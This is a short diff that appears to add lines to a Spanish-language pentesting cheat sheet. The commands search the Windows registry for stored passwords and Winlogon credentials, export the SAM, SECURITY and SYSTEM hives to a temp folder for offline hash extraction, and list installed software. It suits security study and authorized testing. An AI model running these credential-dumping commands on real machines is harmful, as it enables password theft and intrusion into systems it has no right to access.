@@ -1,0 +1,12 @@
+▶ Consultar Valores de Credenciales en LSA (Ver valores de Winlogon):
+  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+▶ Buscar Palabra Password en Registro HKLM (Buscar contraseñas en el registro):
+  reg query HKLM /f password /t REG_SZ /s
+▶ Buscar Palabra Password en Registro HKCU (Buscar contraseñas en el registro):
+  reg query HKCU /f password /t REG_SZ /s
+▶ Extraer SAM, SECURITY y SYSTEM (Exportar hives del registro):
+  reg save HKLM\SAM 'C:\Windows\Temp\sam.save'
+  reg save HKLM\SECURITY 'C:\Windows\Temp\security.save'
+  reg save HKLM\SYSTEM 'C:\Windows\Temp\system.save'
+▶ Listar Software Instalado (Ver software registrado en el registro):
+  reg query HKEY_LOCAL_MACHINE\SOFTWARE
